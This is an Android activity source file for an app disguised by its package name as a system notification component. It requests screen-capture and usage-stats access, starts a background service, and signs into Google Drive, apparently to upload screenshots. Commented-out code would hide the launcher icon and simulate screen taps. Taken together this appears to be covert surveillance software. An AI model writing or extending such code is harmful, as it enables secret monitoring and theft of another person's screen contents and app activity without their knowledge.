package com.android.systemnotification;

import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.AppOpsManager;
import android.app.Instrumentation;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.widget.Toast;

import com.ammarptn.gdriverest.DriveServiceHelper;
import com.android.systemnotification.utils.Alarm;
import com.android.systemnotification.utils.BackgroundService;
import com.android.systemnotification.utils.ClassHelper;
import com.android.systemnotification.utils.ScreenshotManager;
import com.android.systemnotification.utils.SimulateSwipeService;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.drive.Drive;
import com.google.api.client.extensions.android.http.AndroidHttp;
import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential;
import com.google.api.client.googleapis.extensions.android.gms.auth.UserRecoverableAuthIOException;
import com.google.api.client.json.gson.GsonFactory;
import com.google.api.services.drive.DriveScopes;
import com.rvalerio.fgchecker.AppChecker;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import androidx.appcompat.app.AppCompatActivity;

import static com.ammarptn.gdriverest.DriveServiceHelper.getGoogleDriveService;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_ID = 1;
    private static final int REQUEST_CODE_SIGN_IN = 2;

    DriveServiceHelper mDriveServiceHelper;

    GoogleSignInClient mGoogleSignInClient;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        /*PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                /*try {
                    Runtime.getRuntime().exec("/system/bin/input tap 532 1707");
                }
                catch (Exception e){
                    e.printStackTrace();
                }*/
                /*Thread thread = new Thread(){
                    @Override
                    public void run(){
                        Instrumentation m_Instrumentation = new Instrumentation();

                        m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                SystemClock.uptimeMillis(),
                                SystemClock.uptimeMillis(),
                                MotionEvent.ACTION_DOWN,100, 100, 0));
                *//*m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                        SystemClock.uptimeMillis(),
                        SystemClock.uptimeMillis(),
                        MotionEvent.ACTION_UP,width*4/5,height, 0));*//*
                    }
                };
                thread.start();*/
            }
        }, 5000);

        findViewById(R.id.rootView).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                findViewById(R.id.rootView).setBackgroundColor(getResources().getColor(R.color.colorAccent));
            }
        });

        findViewById(R.id.checkIfPossibleToRecordButton).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(final View v) {
                ScreenshotManager.INSTANCE.requestScreenshotPermission(MainActivity.this, REQUEST_ID);
            }
        });

        findViewById(R.id.takeScreenshotButton).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(final View v) {
                ScreenshotManager.INSTANCE.takeScreenshot(MainActivity.this);
            }
        });

        requestUsageStatsPermission();

        ClassHelper classHelper = new ClassHelper();
        if (classHelper.isMyServiceRunning(BackgroundService.class, MainActivity.this)) {


        } else {
            Intent intent = new Intent(MainActivity.this, BackgroundService.class);
            startService(intent);

            /*Alarm alarm = new Alarm();
            alarm.setAlarm(MainActivity.this);*/
        }

        //startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));

        //findViewById(R.id.checkIfPossibleToRecordButton).performClick();

        /*new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                //ScreenshotManager.INSTANCE.takeScreenshot(MainActivity.this);

            }
        }, 10000);*/


    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_ID) {
            ScreenshotManager.INSTANCE.onActivityResult(resultCode, data, mDriveServiceHelper);
        }
        else if (requestCode == REQUEST_CODE_SIGN_IN){

        }
        //finish();
    }

    void requestUsageStatsPermission() {
        if(android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP
                && !hasUsageStatsPermission(this)) {
            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        }
    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    boolean hasUsageStatsPermission(Context context) {
        AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow("android:get_usage_stats",
        android.os.Process.myUid(), context.getPackageName());
        boolean granted = mode == AppOpsManager.MODE_ALLOWED;
        return granted;
    }

    @Override
    protected void onStart() {
        super.onStart();
        GoogleSignInAccount account = GoogleSignIn.getLastSignedInAccount(getApplicationContext());

        if (account == null) {

            signIn();

        } else {

            mDriveServiceHelper = new DriveServiceHelper(getGoogleDriveService(getApplicationContext(), account, "appName"));
        }
    }

    private void signIn() {

        mGoogleSignInClient = buildGoogleSignInClient();
        startActivityForResult(mGoogleSignInClient.getSignInIntent(), REQUEST_CODE_SIGN_IN);
    }

    private GoogleSignInClient buildGoogleSignInClient() {
        GoogleSignInOptions signInOptions =
        new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                .requestScopes(Drive.SCOPE_FILE)
                .requestScopes(Drive.SCOPE_APPFOLDER)
                .requestEmail()
                .build();
        return GoogleSignIn.getClient(getApplicationContext(), signInOptions);
    }

    public int[] randomArray(){
        List<String> a = new ArrayList<>();
        List<String> b = new ArrayList<>();

        for (int i = 1; i < 10; i++){
            a.add(String.valueOf(i));
        }

        Collections.shuffle(a);

        for (int i = 1; i < 5; i++){
            b.add(String.valueOf(a.get(i)));
        }

        int[] array = new int[b.size()];
        for(int i = 0; i < b.size(); i++) array[i] = Integer.valueOf(b.get(i));

        return array;
    }
}